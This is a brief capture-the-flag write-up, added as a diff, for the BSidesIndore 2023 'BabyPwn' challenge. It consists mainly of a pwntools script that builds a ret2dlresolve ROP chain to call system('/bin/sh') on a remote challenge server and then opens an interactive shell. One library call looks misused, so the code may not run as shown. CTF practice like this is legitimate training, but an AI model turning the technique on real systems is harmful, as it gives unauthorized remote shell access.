@@ -1,0 +1,33 @@
+For this challenge I used the following script
+
+#!/usr/bin/env python3
+# encoding: utf-8
+
+from pwn import *
+
+PATH = "/home/xthaz/Documents/CTF/2023/BSidesIndore/pwn/BabyPwn/chall"
+REMOTE = True
+
+if REMOTE:
+    HOST = "34.125.56.151"
+    PORT = 3333
+   
+    r = remote(host=HOST, port=PORT)
+
+else:
+    r = process([PATH])
+
+context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get(PATH))
+
+rop = ROP(context.binary)
+dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
+
+rop.read(0, dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+
+log.success(f"ROP chain: {rop.dump()}")
+
+payload = fit({73: rop.chain(), 0x70: dlresolve.payload})
+
+r.sendline(payload)
+r.interactive()
